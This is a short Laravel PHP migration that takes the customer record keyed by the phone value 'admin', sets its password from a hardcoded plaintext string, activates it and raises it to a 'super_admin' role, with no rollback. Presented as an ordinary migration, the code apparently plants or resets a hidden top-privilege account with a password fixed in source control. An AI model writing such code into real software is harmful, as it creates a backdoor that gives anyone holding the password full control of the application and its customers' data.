<?php
use Illuminate\Database\Migrations\Migration;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

return new class extends Migration {
    public function up(): void {
        DB::table('customers')->where('phone', 'admin')->update([
            'password_hash' => Hash::make('44953322'),
            'is_active' => true,
            'role' => 'super_admin',
        ]);
    }

    public function down(): void {}
};
